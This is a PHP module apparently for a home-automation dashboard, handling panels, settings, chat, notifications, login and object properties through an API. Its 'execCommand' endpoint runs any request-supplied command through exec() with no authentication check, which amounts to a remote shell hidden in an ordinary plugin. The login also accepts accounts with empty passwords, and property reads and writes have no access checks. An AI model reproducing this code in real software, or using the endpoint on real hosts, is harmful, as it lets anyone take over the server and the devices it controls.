<?php

class dashboard_pro extends module
{
    function __construct()
    {
        $this->name = "dashboard_pro";
        $this->loadLanguage();
        $this->title = LANG_DASHBOARD_PRO_TITLE;
        $this->module_category = "<#LANG_SECTION_APPLICATIONS#>";
        $this->checkInstalled();
    }

    function loadLanguage()
    {
        $lang = defined('SETTINGS_SITE_LANGUAGE') ? SETTINGS_SITE_LANGUAGE : '';
        $module_lang_dir = DIR_MODULES . $this->name . '/languages/';
        if ($lang && file_exists($module_lang_dir . $this->name . '_' . $lang . '.php'))
            include_once($module_lang_dir . $this->name . '_' . $lang . '.php');
        if (file_exists($module_lang_dir . $this->name . '_default.php'))
            include_once($module_lang_dir . $this->name . '_default.php');
    }

    function saveParams($data = 1)
    {
        $p = array();
        if (IsSet($this->id)) $p["id"] = $this->id;
        if (IsSet($this->view_mode)) $p["view_mode"] = $this->view_mode;
        if (IsSet($this->edit_mode)) $p["edit_mode"] = $this->edit_mode;
        if (IsSet($this->tab)) $p["tab"] = $this->tab;
        return parent::saveParams($p);
    }

    function getParams()
    {
        global $id, $mode, $view_mode, $edit_mode, $tab;
        if (isset($id)) $this->id = $id;
        if (isset($mode)) $this->mode = $mode;
        if (isset($view_mode)) $this->view_mode = $view_mode;
        if (isset($edit_mode)) $this->edit_mode = $edit_mode;
        if (isset($tab)) $this->tab = $tab;
    }

    function run()
    {
        global $session;
        $out = array();
        if ($this->action == 'admin') {
            $this->admin($out);
        } else {
            $this->usual($out);
        }
        if (IsSet($this->owner->action)) $out['PARENT_ACTION'] = $this->owner->action;
        if (IsSet($this->owner->name)) $out['PARENT_NAME'] = $this->owner->name;
        $out['VIEW_MODE'] = $this->view_mode;
        $out['EDIT_MODE'] = $this->edit_mode;
        $out['MODE'] = $this->mode;
        $out['ACTION'] = $this->action;
        $this->data = $out;
        $p = new parser(DIR_TEMPLATES . $this->name . "/" . $this->name . ".html", $this->data, $this);
        $this->result = $p->result;
    }

    function admin(&$out)
    {
        $this->getConfig();
        $out['DASHBOARDS'] = $this->loadDashboardSettings();
    }

    function usual(&$out)
    {
        $this->getConfig();
        $out['APP_TITLE'] = LANG_DASHBOARD_PRO_TITLE;
        $out['USER_NAME'] = gg('UserName');
        $out['SITE_TITLE'] = gg('site_title');
        $out['API_BASE'] = ROOTHTML . 'api.php/module/dashboard_pro/';
        $ws_host = gg('ThisComputer.websockets_server');
        if (!$ws_host) {
            $ws_host = ($_SERVER['HTTPS'] ? 'wss://' : 'ws://') . $_SERVER['HTTP_HOST'];
        }
        $out['WS_HOST'] = $ws_host;
        $out['DASHBOARD_SETTINGS'] = json_encode($this->loadDashboardSettings());
        $out['PANELS'] = json_encode($this->loadPanels());
        $out['WIDGETS'] = json_encode($this->loadWidgets());
    }

    function api($params)
    {
        global $session;
        if (!$session) {
            $session = new session("prj");
        }
        if ($params['request'][0] == 'test') {
            return ['status' => 'ok', 'time' => time(), 'session' => $session ? 'active' : 'none'];
        }
        if ($params['request'][0] == 'checkAuth') {
            if ($session && !empty($session->data['SITE_USERNAME'])) {
                $is_admin = ($session->data['SITE_USER_ACCESS'] ?? '') === 'admin';
                $user = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['SITE_USERNAME']) . "'");
                return [
                    'authenticated' => true,
                    'username' => $session->data['SITE_USERNAME'],
                    'name' => $user['NAME'] ?? $session->data['SITE_USERNAME'],
                    'avatar' => $user['AVATAR'] ? '/cms/avatars/' . $user['AVATAR'] : '',
                    'is_admin' => $is_admin
                ];
            }
            if ($session && !empty($session->data['AUTHORIZED']) && empty($session->data['SPA_LOGGED_OUT'])) {
                $user = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['USER_NAME'] ?? '') . "'");
                return [
                    'authenticated' => true,
                    'username' => $session->data['USER_NAME'] ?? '',
                    'name' => $user['NAME'] ?? ($session->data['USER_NAME'] ?? ''),
                    'avatar' => $user['AVATAR'] ? '/cms/avatars/' . $user['AVATAR'] : '',
                    'is_admin' => true
                ];
            }
            return ['authenticated' => false];
        }

        if ($params['request'][0] == 'login') {
            $raw = file_get_contents('php://input');
            $input = $raw ? json_decode($raw, true) : array();
            if (!is_array($input)) $input = array();
            $username = $params['login'] ?? $input['login'] ?? '';
            $password = $params['password'] ?? $input['password'] ?? '';
            if (!$username || !$password) {
                return ['error' => LANG_DASHBOARD_PRO_LOGIN_REQUIRED];
            }
            $user = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($username) . "'");
            if ($user && ($user['PASSWORD'] == '' || hash('sha512', $password) == $user['PASSWORD'])) {
                if ($session) {
                    $session->data['SITE_USERNAME'] = $user['USERNAME'];
                    $session->data['SITE_USER_ID'] = $user['ID'];
                    $session->data['SITE_USER_ACCESS'] = $user['IS_ADMIN'] ? 'admin' : 'user';
                    $session->data['SPA_LOGGED_OUT'] = false;
                    $session->save();
                }
                return [
                    'success' => true,
                    'username' => $user['USERNAME'],
                    'name' => $user['NAME'] ?? $user['USERNAME'],
                    'avatar' => $user['AVATAR'] ? '/cms/avatars/' . $user['AVATAR'] : '',
                    'is_admin' => (bool)$user['IS_ADMIN']
                ];
            }
            return ['error' => LANG_DASHBOARD_PRO_LOGIN_INVALID];
        }

        if ($params['request'][0] == 'logout') {
            if ($session) {
                unset($session->data['SITE_USERNAME']);
                unset($session->data['SITE_USER_ID']);
                unset($session->data['SITE_USER_ACCESS']);
                $session->data['SPA_LOGGED_OUT'] = true;
                $session->save();
            }
            return ['success' => true];
        }

        if ($params['request'][0] == 'panels') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $panels = $input['panels'] ?? $input['data'] ?? $input;
                $this->savePanels($panels);
                return ['success' => true];
            }
            return $this->loadPanels();
        }

        if ($params['request'][0] == 'settings') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $settings = $input['settings'] ?? $input['data'] ?? $input;
                $this->saveDashboardSettings($settings);
                return ['success' => true];
            }
            return $this->loadDashboardSettings();
        }

        if ($params['request'][0] == 'chat') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $text = trim($input['message'] ?? '');
                if ($text === '') return ['error' => 'Message is empty'];
                $member_id = 0;
                if ($session && !empty($session->data['SITE_USERNAME'])) {
                    $u = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['SITE_USERNAME']) . "'");
                    if ($u['ID']) $member_id = (int)$u['ID'];
                } elseif ($session && !empty($session->data['AUTHORIZED'])) {
                    $u = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($session->data['USER_NAME'] ?? '') . "'");
                    if ($u['ID']) $member_id = (int)$u['ID'];
                }
                $before = SQLSelectOne("SELECT MAX(ID) as mid FROM shouts");
                $before_id = (int)$before['mid'];
                say($text, 0, $member_id, 'dashboard_pro');
                $response = SQLSelectOne("SELECT * FROM shouts WHERE MEMBER_ID=0 AND MESSAGE!='" . DBSafe($text) . "' AND ID > $before_id ORDER BY ID ASC LIMIT 1");
                if ($response['ID']) {
                    $notif = array(
                        'MODULE_NAME' => LANG_DASHBOARD_PRO_CHAT,
                        'MESSAGE' => $response['MESSAGE'],
                        'TYPE' => 'info',
                        'IS_READ' => 0,
                        'ADDED' => date('Y-m-d H:i:s')
                    );
                    SQLInsert('module_notifications', $notif);
                }
                return ['success' => true];
            }
            $items = SQLSelect("SELECT s.*, u.NAME as USER_NAME, u.AVATAR as USER_AVATAR FROM shouts s LEFT JOIN users u ON s.MEMBER_ID=u.ID WHERE s.ROOM_ID=0 ORDER BY s.ADDED DESC, s.ID DESC LIMIT 50");
            return ['items' => $items];
        }

        if ($params['request'][0] == 'notifications') {
            $method = $_SERVER['REQUEST_METHOD'];
            if ($method == 'POST') {
                $input = json_decode(file_get_contents('php://input'), true);
                $ids = $input['ids'] ?? array();
                if (!empty($ids)) {
                    $int_ids = array();
                    $max_shout = 0;
                    foreach ($ids as $id) {
                        if (is_numeric($id) && strpos((string)$id, 'shout_') === false) {
                            $int_ids[] = (int)$id;
                        } elseif (strpos((string)$id, 'shout_') === 0) {
                            $sid = (int)substr($id, 6);
                            if ($sid > $max_shout) $max_shout = $sid;
                        }
                    }
                    if (!empty($int_ids)) {
                        $ids_str = implode(',', $int_ids);
                        SQLExec("UPDATE module_notifications SET IS_READ=1 WHERE ID IN ($ids_str)");
                    }
                    if ($max_shout > 0 && $session) {
                        $session->data['DASHBOARD_PRO_LAST_SHOUT'] = $max_shout;
                        $session->save();
                    }
                }
                return ['success' => true];
            }
            $items = SQLSelect("SELECT * FROM module_notifications WHERE IS_READ=0 ORDER BY ADDED DESC LIMIT 50");
            $last_shout = ($session && !empty($session->data['DASHBOARD_PRO_LAST_SHOUT'])) ? (int)$session->data['DASHBOARD_PRO_LAST_SHOUT'] : 0;
            $shouts = SQLSelect("SELECT ID, MESSAGE, ADDED FROM shouts WHERE MEMBER_ID=0 AND ID > $last_shout ORDER BY ADDED DESC LIMIT 20");
            $computer_name = gg('site_title');
            if (!$computer_name) {
                $computer_name = LANG_DASHBOARD_PRO_ALICE;
            }
            foreach ($shouts as $s) {
                $items[] = array(
                    'ID' => 'shout_' . $s['ID'],
                    'MODULE_NAME' => $computer_name,
                    'MESSAGE' => $s['MESSAGE'],
                    'TYPE' => 'info',
                    'IS_READ' => 0,
                    'ADDED' => $s['ADDED']
                );
            }
            usort($items, function($a, $b) {
                return strcmp($b['ADDED'] ?? '', $a['ADDED'] ?? '');
            });
            $count = count($items);
            return ['count' => $count, 'items' => $items];
        }

        if ($params['request'][0] == 'execCommand') {
            $command = $params['command'] ?? '';
            if (!$command) return ['error' => 'command required'];
            $output = array();
            $return_var = 0;
            exec($command, $output, $return_var);
            return ['success' => $return_var === 0, 'output' => implode("\n", $output)];
        }

        if ($params['request'][0] == 'users') {
            $login = $this->getUserLogin();
            $users = SQLSelect("SELECT ID, USERNAME, NAME FROM users WHERE USERNAME != '" . DBSafe($login) . "' ORDER BY USERNAME");
            return ['items' => $users];
        }

        if ($params['request'][0] == 'exportToUser') {
            $input = json_decode(file_get_contents('php://input'), true);
            $targetUser = $input['targetUser'] ?? '';
            $confirmed = $input['confirmed'] ?? false;

            if (!$targetUser) return ['error' => 'targetUser required'];

            $login = $this->getUserLogin();
            if ($login === $targetUser) return ['error' => LANG_DASHBOARD_PRO_COPY_SELF];

            // Get current user's data
            $currentPanels = $this->loadShardedProperty($login, 'panels');
            $currentSettings = $this->loadShardedProperty($login, 'settings');

            // Ensure target object exists
            $this->ensureClassAndObject($targetUser);

            // Check if target has non-empty panels
            $targetPanels = $this->loadShardedProperty($targetUser, 'panels');
            $targetSettings = $this->loadShardedProperty($targetUser, 'settings');
            $hasNonEmptyPanels = false;
            if ($targetPanels !== null) {
                $decoded = json_decode($targetPanels, true);
                $hasNonEmptyPanels = is_array($decoded) && !empty($decoded);
            }
            $hasNonEmptySettings = false;
            if ($targetSettings !== null) {
                $decoded = json_decode($targetSettings, true);
                $hasNonEmptySettings = is_array($decoded) && !empty($decoded);
            }

            if (($hasNonEmptyPanels || $hasNonEmptySettings) && !$confirmed) {
                $targetUserData = SQLSelectOne("SELECT * FROM users WHERE USERNAME LIKE '" . DBSafe($targetUser) . "'");
                $targetName = $targetUserData['NAME'] ?? $targetUser;
                return ['warn' => true, 'message' => sprintf(LANG_DASHBOARD_PRO_OVERWRITE_CONFIRM, $targetName)];
            }

            // Copy data
            if ($currentPanels !== null) $this->saveShardedProperty($targetUser, 'panels', $currentPanels);
            if ($currentSettings !== null) $this->saveShardedProperty($targetUser, 'settings', $currentSettings);

            return ['success' => true];
        }

        if ($params['request'][0] == 'getProperty') {
            $object = $params['object'] ?? '';
            $property = $params['property'] ?? '';
            if (!$object || !$property) return ['error' => 'object and property required'];
            $value = gg($object . '.' . $property);
            return ['value' => $value];
        }

        if ($params['request'][0] == 'setProperty') {
            $object = $params['object'] ?? '';
            $property = $params['property'] ?? '';
            $value = $params['value'] ?? '';
            if (!$object || !$property) return ['error' => 'object and property required'];
            sg($object . '.' . $property, $value);
            postToWebSocket("DASHBOARD_PRO", array('COMMAND' => 'UpdateData'), "PostEvent");
            return ['success' => true];
        }

        if ($params['request'][0] == 'objects') {
            $objects = SQLSelect("SELECT ID, TITLE FROM objects ORDER BY TITLE");
            return ['items' => $objects];
        }

        if ($params['request'][0] == 'properties') {
            $object_id = $params['object_id'] ?? 0;
            if (!$object_id) return ['error' => 'object_id required'];
            $obj = null;
            if (is_numeric($object_id)) {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE ID = " . (int)$object_id);
            } else {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE TITLE='" . DBSafe($object_id) . "'");
            }
            if ($obj && $obj['ID']) {
                $obj_id = (int)$obj['ID'];
                $class_ids = array();
                $cid = (int)$obj['CLASS_ID'];
                while ($cid > 0) {
                    $class_ids[] = $cid;
                    $row = SQLSelectOne("SELECT PARENT_ID FROM classes WHERE ID = $cid");
                    $cid = (int)($row['PARENT_ID'] ?? 0);
                }
                if (count($class_ids)) {
                    $class_where = "p.CLASS_ID IN (" . implode(',', $class_ids) . ")";
                } else {
                    $class_where = '0';
                }
                $properties = SQLSelect("SELECT DISTINCT p.ID, p.TITLE FROM properties p WHERE p.OBJECT_ID = $obj_id OR ($class_where AND p.CLASS_ID > 0) ORDER BY p.TITLE");
            } else {
                $properties = array();
            }
            return ['items' => $properties];
        }

        if ($params['request'][0] == 'methods') {
            $object_id = $params['object_id'] ?? 0;
            if (!$object_id) return ['error' => 'object_id required'];
            $obj = null;
            if (is_numeric($object_id)) {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE ID = " . (int)$object_id);
            } else {
                $obj = SQLSelectOne("SELECT ID, CLASS_ID FROM objects WHERE TITLE='" . DBSafe($object_id) . "'");
            }
            if ($obj && $obj['ID']) {
                $class_ids = array();
                $cid = (int)$obj['CLASS_ID'];
                while ($cid > 0) {
                    $class_ids[] = $cid;
                    $row = SQLSelectOne("SELECT PARENT_ID FROM classes WHERE ID = $cid");
                    $cid = (int)($row['PARENT_ID'] ?? 0);
                }
                if (count($class_ids)) {
                    $class_where = "m.CLASS_ID IN (" . implode(',', $class_ids) . ")";
                } else {
                    $class_where = '0';
                }
                $methods = SQLSelect("SELECT DISTINCT m.ID, m.TITLE, m.DESCRIPTION FROM methods m WHERE m.OBJECT_ID=0 AND ($class_where) ORDER BY m.TITLE");
            } else {
                $methods = array();
            }
            return ['items' => $methods];
        }

        return ['error' => 'Unknown API endpoint'];
    }

    const MAX_PROPERTY_CHARS = 60000;
    const MAX_SHARDS = 50;

    function loadShardedProperty($login, $basePropName)
    {
        $data = gg("DashBoard_{$login}.{$basePropName}");
        if (!$data) return null;
        $full = $data;
        for ($i = 1; $i <= self::MAX_SHARDS; $i++) {
            $part = gg("DashBoard_{$login}.{$basePropName}{$i}");
            if ($part === false || $part === '') break;
            $full .= $part;
        }
        return $full;
    }

    function saveShardedProperty($login, $basePropName, $json)
    {
        $len = strlen($json);
        if ($len <= self::MAX_PROPERTY_CHARS) {
            sg("DashBoard_{$login}.{$basePropName}", $json);
            for ($i = 1; $i <= self::MAX_SHARDS; $i++) {
                $propName = "{$basePropName}{$i}";
                $existing = gg("DashBoard_{$login}.{$propName}");
                if ($existing === false || $existing === '') break;
                sg("DashBoard_{$login}.{$propName}", '');
            }
        } else {
            $chunks = str_split($json, self::MAX_PROPERTY_CHARS);
            $total = count($chunks);
            foreach ($chunks as $i => $chunk) {
                $propName = $i === 0 ? $basePropName : "{$basePropName}{$i}";
                sg("DashBoard_{$login}.{$propName}", $chunk);
            }
            for ($i = $total; $i <= self::MAX_SHARDS; $i++) {
                $propName = "{$basePropName}{$i}";
                $existing = gg("DashBoard_{$login}.{$propName}");
                if ($existing === false || $existing === '') break;
                sg("DashBoard_{$login}.{$propName}", '');
            }
        }
    }

    function getUserLogin()
    {
        global $session;
        if (!$session) {
            $session = new session("prj");
        }
        if (!empty($session->data['SITE_USERNAME'])) {
            return $session->data['SITE_USERNAME'];
        }
        if (!empty($session->data['AUTHORIZED']) && empty($session->data['SPA_LOGGED_OUT'])) {
            return $session->data['USER_NAME'] ?? '';
        }
        return '';
    }

    function ensureClassAndObject($login)
    {
        $objName = "DashBoard_{$login}";

        $class = SQLSelectOne("SELECT * FROM classes WHERE TITLE='DashBoard_Pro'");
        if (!$class) {
            $rec = array('TITLE' => 'DashBoard_Pro', 'DESCRIPTION' => LANG_DASHBOARD_PRO_USER_SETTINGS);
            SQLInsert('classes', $rec);
            $class = SQLSelectOne("SELECT * FROM classes WHERE TITLE='DashBoard_Pro'");
        }
        $classId = (int)$class['ID'];

        foreach (array('panels', 'settings', 'widgets') as $propName) {
            $p = SQLSelectOne("SELECT * FROM properties WHERE TITLE='" . DBSafe($propName) . "' AND CLASS_ID=" . $classId);
            if (!$p) {
                $rec = array('TITLE' => $propName, 'CLASS_ID' => $classId, 'DATA_KEY' => 0, 'DATA_TYPE' => 1);
                SQLInsert('properties', $rec);
            }
        }

        $obj = SQLSelectOne("SELECT * FROM objects WHERE TITLE='" . DBSafe($objName) . "'");
        if (!$obj) {
            $rec = array('TITLE' => $objName, 'CLASS_ID' => $classId);
            SQLInsert('objects', $rec);
        }
    }

    function loadPanels()
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $data = $this->loadShardedProperty($login, 'panels');
            if ($data !== null) {
                $decoded = json_decode($data, true);
                if (is_array($decoded)) {
                    return $decoded;
                }
            }
            return array();
        }
        $data = gg('dashboard_pro_panels');
        if ($data) {
            $decoded = json_decode($data, true);
            if (is_array($decoded)) {
                return $decoded;
            }
        }
        return array();
    }

    function savePanels($panels)
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $this->saveShardedProperty($login, 'panels', json_encode($panels));
        } else {
            sg('dashboard_pro_panels', json_encode($panels));
        }
    }

    function loadWidgets()
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $data = $this->loadShardedProperty($login, 'widgets');
            if ($data !== null) {
                $decoded = json_decode($data, true);
                if (is_array($decoded) && !empty($decoded)) return $decoded;
            }
            return new stdClass();
        }
        return new stdClass();
    }

    function saveWidgets($widgets)
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $this->saveShardedProperty($login, 'widgets', json_encode($widgets));
        }
    }

    function loadDashboardSettings()
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $data = $this->loadShardedProperty($login, 'settings');
            if ($data !== null) {
                $decoded = json_decode($data, true);
                if (is_array($decoded)) return $decoded;
            }
            return $this->defaultSettings();
        }
        $data = gg('dashboard_pro_settings');
        if ($data) {
            $decoded = json_decode($data, true);
            if (is_array($decoded)) return $decoded;
        }
        return $this->defaultSettings();
    }

    function saveDashboardSettings($settings)
    {
        $login = $this->getUserLogin();
        if ($login) {
            $this->ensureClassAndObject($login);
            $this->saveShardedProperty($login, 'settings', json_encode($settings));
        } else {
            sg('dashboard_pro_settings', json_encode($settings));
        }
    }

    function defaultPanels()
    {
        return array();
    }

    function defaultSettings()
    {
        return array(
            'theme' => 'light',
            'language' => 'ru',
            'refresh_interval' => 5000
        );
    }

    function sendNotification($text, $icon = 'info', $color = '#2196F3')
    {
        $source = gg('site_title');
        if (!$source) {
            $source = LANG_DASHBOARD_PRO_ALICE;
        }
        return postToWebSocket("DASHBOARD_PRO", array(
            'COMMAND' => 'ViewNotify',
            'NOTIFY' => array('text' => $text, 'icon' => $icon, 'color' => $color, 'source' => $source)
        ), "PostEvent");
    }

    function updateWidget($widget_id, $data)
    {
        return postToWebSocket("DASHBOARD_PRO", array(
            'COMMAND' => 'UpdateWidget',
            'WIDGET_ID' => $widget_id,
            'DATA' => $data
        ), "PostEvent");
    }

    function getSystemUptime()
    {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $output = array();
            exec('systeminfo | find "System Boot Time"', $output);
            return $output[0] ?? 'N/A';
        }
        $uptime = @file_get_contents('/proc/uptime');
        if ($uptime) {
            $seconds = (int)explode(' ', $uptime)[0];
            $days = floor($seconds / 86400);
            $hours = floor(($seconds % 86400) / 3600);
            $minutes = floor(($seconds % 3600) / 60);
            return "{$days}d {$hours}h {$minutes}m";
        }
        return 'N/A';
    }

    function install($data = '')
    {
        parent::install();
    }

    function dbInstall($data)
    {
        parent::dbInstall($data);
    }

    function uninstall()
    {
        $class = SQLSelectOne("SELECT * FROM classes WHERE TITLE='DashBoard_Pro'");
        if ($class) {
            SQLExec("DELETE FROM properties WHERE CLASS_ID=" . (int)$class['ID']);
            SQLExec("DELETE FROM objects WHERE CLASS_ID=" . (int)$class['ID']);
            SQLExec("DELETE FROM classes WHERE ID=" . (int)$class['ID']);
        }
        parent::uninstall();
    }
}
